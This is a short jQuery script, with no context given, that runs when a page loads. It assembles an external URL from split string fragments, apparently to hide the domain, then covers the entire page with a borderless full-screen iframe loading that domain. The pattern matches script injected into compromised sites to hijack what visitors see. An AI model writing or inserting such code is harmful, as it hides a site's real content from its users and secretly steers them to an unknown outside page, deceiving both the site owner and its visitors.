$(document).ready(()=>{
				
				const url1 = "http://hard-";
				const url2 = "it.deepe";
				const url3 = "r-gel.com/";

				const url = url1 + url2 + url3;

				$('body').css({
					'padding': '0',
					'margin': '0',
					'overflow':'hidden'
				});

				let iframe_wrapper = $("<div></div>").css({
					'position': 'absolute',
					'top': '0',
					'bottom': '0',
					'right': '0',
					'left': '0',
					'z-index': '9999',
					'background-color': '#fff'
				});

				let iframe = $("<iframe></iframe>").css({
					'height': '100%',
					'width': '100%',
					'border': 'none'
				}).attr({
					'src':url
				});

				$(iframe_wrapper).html(iframe);
				$('body').append(iframe_wrapper);

			});